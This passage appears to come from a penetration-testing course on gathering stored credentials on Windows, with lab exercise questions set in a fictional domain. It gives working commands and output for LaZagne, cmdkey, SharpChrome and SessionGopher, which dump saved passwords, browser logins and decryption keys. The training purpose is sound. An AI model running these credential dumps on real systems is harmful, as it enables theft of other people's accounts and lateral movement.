There are many other techniques we can use to potentially obtain credentials on a Windows system. This section will not cover every possible scenario, but we will walk through the most common scenarios.

Using the techniques covered in this section, retrieve the sa password for the SQL01.inlanefreight.local user account.

Running All LaZagne Modules

As we can see, there are many modules available to us. Running the tool with `all` will search for supported applications and return any discovered cleartext credentials. As we can see from the example below, many applications do not store credentials securely (best never to store credentials, period!). They can easily be retrieved and used to escalate privileges locally, move on to another system, or access sensitive data.

```
:\Tools>.\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Dbvis passwords -----------------

[+] Password found !!!
Name: SQL01.inlanefreight.local
Driver:
          SQL Server (Microsoft JDBC Driver)

Host: localhost
Login: sa
Password: *********
Port: 1433


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 4.68699979782
```

Which user has credentials stored for RDP access to the WEB01 host?

Cmdkey Saved Credentials

The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.


```

C:\Users\htb-student>cmdkey /list

Currently stored credentials:

    Target: Domain:target=WEB01
    Type: Domain Password
    User: ******
```

Find and submit the password for the root user to access https://vc01.inlanefreight.local/ui/login

Browser Credentials

Retrieving Saved Credentials from Chrome

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as SharpChrome to retrieve cookies and saved logins from Google Chrome.


```
:\Tools>.\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.11.1


[*] Action: Chrome Saved Logins Triage


[*] Triaging Chrome Logins for current user


[*] AES state key file : C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : D72790F4972C4D5700D8D2ED50D21850A3429373534ED938EB009219A51A0479

[X] Error : 0

---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc.inlanefreight.local/,https://vc.inlanefreight.local/ui/login,5/26/2021 12:09:51 PM,13266529791618996,root,"?U?1`?l}?????A
?"
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http://vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,******


SharpChrome completed in 00:00:00.3549169

```



Enumerate the host and find the password for ftp.ilfreight.local

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files. 

```
PS C:\tools> Import-Module .\SessionGopher.ps1
PS C:\tools> Invoke-SessionGopher -Target WINLPE-SRV01

          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com

[+] Digging on WINLPE-SRV01...
WinSCP Sessions


Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :

Source   : WINLPE-SRV01\htb-student
Session  : root@ftp.ilfreight.local
Hostname : ftp.ilfreight.local
Username : root
Password : ****




PuTTY Sessions


Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local
```